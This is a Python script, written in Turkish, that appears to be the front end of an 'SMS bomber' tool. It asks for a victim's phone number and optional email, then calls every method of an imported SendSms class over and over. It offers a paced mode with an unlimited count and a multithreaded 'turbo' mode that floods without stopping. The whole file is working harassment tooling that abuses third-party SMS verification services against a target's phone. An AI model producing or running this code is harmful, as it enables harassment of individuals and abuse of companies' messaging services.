from colorama import Fore, Style, init
from time import sleep
from os import system
from sms import SendSms
import datetime
import threading

init(autoreset=True)
system("cls||clear")

# Servisleri dinamik çek
servisler_sms = [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith("__")]

def rainbow_text(text):
    colors = [31, 33, 32, 36, 34, 35]
    result = ""
    i = 0
    for char in text:
        result += f"\033[1;{colors[i]}m{char}"
        i = (i + 1) % len(colors)
    result += "\033[0m"
    return result

def banner():
    print()
    print(rainbow_text("███████ ███████ ██████   ██████  ██     ██ ██████   █████  ██████   █████  ██████ "))
    print(rainbow_text("██      ██      ██   ██ ██       ██     ██ ██   ██ ██   ██ ██   ██ ██   ██ ██   ██ "))
    print(rainbow_text("█████   █████   ██████  ██   ███ ██  █  ██ ██████  ███████ ██   ██ ███████ ██   ██ "))
    print(rainbow_text("██      ██      ██      ██    ██ ██ ███ ██ ██      ██   ██ ██   ██ ██   ██ ██   ██ "))
    print(rainbow_text("██      ███████ ██       ██████   ███ ███  ██      ██   ██ ██████  ██   ██ ██████  "))
    print(rainbow_text("                          Z E R O W B A B A                          "))
    print(Fore.CYAN + "✦ Welcome back, cyber warrior.")
    print(Fore.GREEN + f"✦ System Initialized at {datetime.datetime.now().strftime('%H:%M:%S')}")
    print(Fore.MAGENTA + "✦ Terminal Mode: " + Fore.YELLOW + "ACTIVE")
    print()

def sms_gonder(normal=True):
    system("cls||clear")
    tel_no = input(Fore.YELLOW + "Telefon numarası (başında +90 olmadan): " + Fore.GREEN).strip()

    if len(tel_no) != 10 or not tel_no.isdigit():
        print(Fore.RED + "Hatalı telefon numarası. Tekrar deneyiniz.")
        sleep(2)
        return

    mail = input(Fore.YELLOW + "Mail adresi (Enter = boş): " + Fore.GREEN).strip()
    if mail and ("@" not in mail or ".com" not in mail):
        print(Fore.RED + "Hatalı mail adresi. Tekrar deneyiniz.")
        sleep(2)
        return

    sms = SendSms(tel_no, mail)

    if normal:
        try:
            kere = input(Fore.YELLOW + "Kaç adet SMS gönderilsin? (Enter = sonsuz): " + Fore.GREEN).strip()
            kere = int(kere) if kere else None
        except ValueError:
            print(Fore.RED + "Hatalı giriş. Tekrar deneyiniz.")
            sleep(2)
            return

        try:
            aralik = int(input(Fore.YELLOW + "Kaç saniye aralıkla gönderilsin?: " + Fore.GREEN).strip())
        except ValueError:
            print(Fore.RED + "Hatalı giriş. Tekrar deneyiniz.")
            sleep(2)
            return

        system("cls||clear")
        if kere is None:
            while True:
                for fonk in servisler_sms:
                    getattr(sms, fonk)()
                    sleep(aralik)
        else:
            while sms.adet < kere:
                for fonk in servisler_sms:
                    if sms.adet >= kere:
                        break
                    getattr(sms, fonk)()
                    sleep(aralik)
    else:
        stop_event = threading.Event()

        def turbo():
            while not stop_event.is_set():
                threads = []
                for fonk in servisler_sms:
                    t = threading.Thread(target=getattr(sms, fonk), daemon=True)
                    threads.append(t)
                    t.start()
                for t in threads:
                    t.join()

        try:
            turbo()
        except KeyboardInterrupt:
            stop_event.set()
            print(Fore.RED + "\nTurbo modu durduruldu.")
            sleep(2)

while True:
    system("cls||clear")
    banner()
    print(Fore.LIGHTCYAN_EX + f"✦ Yüklü SMS Servis Sayısı: {len(servisler_sms)}\n")

    try:
        secim = input(Fore.LIGHTMAGENTA_EX + "1- SMS Gönder (Normal)\n2- SMS Gönder (Turbo)\n3- Çıkış\n\n" + Fore.YELLOW + "Seçim: ").strip()
        if secim == "1":
            sms_gonder(normal=True)
        elif secim == "2":
            sms_gonder(normal=False)
        elif secim == "3":
            print(Fore.RED + "Çıkış yapılıyor...")
            break
        else:
            raise ValueError
    except ValueError:
        print(Fore.RED + "Geçersiz seçim. Tekrar deneyiniz.")
        sleep(2)
